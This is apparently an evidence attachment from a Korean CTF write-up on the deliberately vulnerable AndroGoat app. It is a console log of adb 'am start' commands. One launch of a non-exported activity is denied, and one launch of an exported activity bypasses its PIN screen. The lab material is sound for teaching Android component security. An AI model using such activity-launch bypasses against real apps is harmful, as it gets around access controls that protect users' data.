---
{"title":"06_activity_bypass_console.txt","date":"2026-11-12","category":"ctf","tags":["AndroGoat","첨부파일","증거"],"summary":"02_components/06_activity_bypass_console.txt · 콘솔·로그 기록 — AndroGoat 라이트업 증거 원본.","section":["AndroGoat","첨부파일"]}
---

> 이 문서는 [AndroGoat 라이트업](/posts/2026-11-12-androgoat.html)의 실측 증거 원본이다. 원본 경로 `02_components/06_activity_bypass_console.txt` · 콘솔·로그 기록.

<pre><code>﻿PS&gt; adb shell su shell id
uid=2000(shell) gid=2000(shell)

# [대조] exported=false 화면 (HardcodeViewActivity)
PS&gt; adb shell su shell am start -n owasp.sat.agoat/.HardcodeViewActivity
Starting: Intent { cmp=owasp.sat.agoat/.HardcodeViewActivity }

Exception occurred while executing &#x27;start&#x27;:
java.lang.SecurityException: Permission Denial: starting Intent { flg=0x10000000 cmp=owasp.sat.agoat/.HardcodeViewActivity } from null (pid=7599, uid=2000) not exported from uid 10174
	at com.android.server.wm.ActivityTaskSupervisor.checkStartAnyActivityPermission(ActivityTaskSupervisor.java:1116)
	at com.android.server.wm.ActivityStarter.executeRequest(ActivityStarter.java:1014)
	at com.android.server.wm.ActivityStarter.execute(ActivityStarter.java:703)
	at com.android.server.wm.ActivityTaskManagerService.startActivityAsUser(ActivityTaskManagerService.java:1293)
	at com.android.server.wm.ActivityTaskManagerService.startActivityAsUser(ActivityTaskManagerService.java:1234)
	at com.android.server.am.ActivityManagerService.startActivityAsUserWithFeature(ActivityManagerService.java:3156)
	at com.android.server.am.ActivityManagerShellCommand.runStartActivity(ActivityManagerShellCommand.java:605)
	at com.android.server.am.ActivityManagerShellCommand.onCommand(ActivityManagerShellCommand.java:208)
	at com.android.modules.utils.BasicShellCommandHandler.exec(BasicShellCommandHandler.java:97)
	at android.os.ShellCommand.exec(ShellCommand.java:38)
	at com.android.server.am.ActivityManagerService.onShellCommand(ActivityManagerService.java:9285)
	at android.os.Binder.shellCommand(Binder.java:1049)
	at android.os.Binder.onTransact(Binder.java:877)
	at android.app.IActivityManager$Stub.onTransact(IActivityManager.java:4731)
	at com.android.server.am.ActivityManagerService.onTransact(ActivityManagerService.java:2628)
	at android.os.Binder.execTransactInternal(Binder.java:1285)
	at android.os.Binder.execTransact(Binder.java:1244)

# [공격] exported=true 화면 (AccessControl1ViewActivity) - PIN 없이
PS&gt; adb shell su shell am start -n owasp.sat.agoat/.AccessControl1ViewActivity
Starting: Intent { cmp=owasp.sat.agoat/.AccessControl1ViewActivity }
</code></pre>

[← 본문으로 돌아가기](/posts/2026-11-12-androgoat.html)
